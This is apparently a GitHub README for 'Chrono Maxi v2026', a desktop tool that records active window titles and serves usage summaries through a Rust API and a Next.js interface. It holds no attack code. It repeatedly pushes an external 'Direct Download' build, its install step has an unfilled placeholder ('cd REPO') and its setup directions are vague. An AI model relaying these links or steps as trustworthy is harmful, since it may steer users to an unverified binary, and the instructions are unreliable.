# Chrono Maxi v2026 - time tracking software 2026

> **Chrono Maxi is a desktop time tracking tool for capturing active window titles, studying usage trends, and browsing activity data through a Rust-backed, Next.js web interface.**

[![Platform](https://img.shields.io/badge/Platform-desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jordan-davis2001/chrono-maxi-v2026-tracker?style=flat-square)](https://github.com/jordan-davis2001/chrono-maxi-v2026-tracker)

---

<p align="center">
  <a href="https://jordan-davis2001.github.io/chrono-maxi-v2026-tracker/">
    <img src="https://img.shields.io/badge/Download-Chrono%20Maxi%20Latest-brightgreen?style=for-the-badge" alt="Download Chrono Maxi">
  </a>
</p>

> **[Direct Download - Chrono Maxi v2026](https://jordan-davis2001.github.io/chrono-maxi-v2026-tracker/)**

---

[Download Latest Build](https://jordan-davis2001.github.io/chrono-maxi-v2026-tracker/)

---

## What Chrono Maxi Does

Chrono Maxi is made for desktop workflows where it helps to know exactly where time went. It logs active window titles with timestamps, keeps the captured activity in SQLite, and converts those entries into readable usage summaries you can inspect later.

The app brings together a Rust data layer, a REST API, and a Next.js frontend so activity records stay available for querying and visualization in a single stack. It fits users who want a clean breakdown of application usage, everyday work patterns, or weekly time distribution without manual timesheets.

---

## Features

- Records active window titles with timestamp data
- Persists tracked activity in a SQLite database
- Computes time spent across apps and activities
- Serves activity records through a REST API
- Displays tracked information in a web-based interface
- Offers daily and weekly review periods
- Uses a Rust backend together with a Next.js frontend
- Built for desktop time tracking and usage analysis

---

## Installation

Clone the repository or download the project files, then open the backend and frontend according to your local layout.

    git clone https://github.com/jordan-davis2001/chrono-maxi-v2026-tracker.git
    cd REPO

After that, start the Rust service and the web frontend using the commands provided in the project files for your environment. If a build output is provided, you can also launch the latest packaged build from the download link above.

---

## Usage

Run the tracker on your desktop, let it watch the active window, and keep the app available while you work. The captured records can then be queried through the API and examined in the interface.

Typical workflow:

1. Start the tracking service.
2. Work normally while active windows are recorded.
3. Open the web interface to inspect usage analytics.
4. Switch between daily and weekly views to compare time patterns.
5. Use the REST API if you want to integrate the data with another frontend or internal tool.

Example access pattern:

    GET /api/activities
    GET /api/summary?range=daily
    GET /api/summary?range=weekly

---

## Configuration

Configuration details are typically kept in the project environment files or service settings used by the Rust backend and frontend. A common setup may include database location and API-related values.

    DATABASE_PATH=./data/chrono-maxi.sqlite
    API_PORT=3000
    FRONTEND_PORT=3001

If your local setup uses different file names or ports, follow the repository's runtime configuration and adjust the values accordingly.

---

## Requirements

- Desktop platform
- Rust runtime/toolchain for the backend
- Node.js environment for the frontend
- SQLite database storage
- Network access for local API and interface communication

---

## FAQ

**How do I view my tracked data?**  
Start the service, then open the web interface to review the collected activity summaries.

**Where is the activity data stored?**  
The tracked records are stored in SQLite.

**Can I use the API directly?**  
Yes. The project includes a REST API intended for frontend access and other integrations.

**Is there a daily and weekly view?**  
Yes. The interface supports both daily and weekly time frames.

**What if the app does not start correctly?**  
Check your Rust and Node.js versions, confirm the database path, and verify that the expected service ports are available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
